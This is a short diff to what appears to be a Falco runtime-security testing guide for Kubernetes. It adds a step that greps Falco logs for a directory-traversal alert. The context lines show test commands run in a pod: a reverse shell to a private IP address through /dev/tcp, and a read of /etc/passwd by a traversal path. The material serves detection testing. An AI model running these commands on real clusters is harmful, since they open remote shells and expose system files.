@@ -217,3 +217,8 @@ kubectl exec -it developer-test-pod -n default -- sh -c 'bash -i >& /dev/tcp/10.
 kubectl exec -it developer-test-pod -n default -- touch /var/log/auth.log
 kubectl exec -it developer-test-pod -n default -- cat /usr/bin/../..//etc/passwd
 ```
+
+directory traversal:
+```
+kubectl logs -l app.kubernetes.io/name=falco -n falco -c falco | grep "directory traversal"
+```
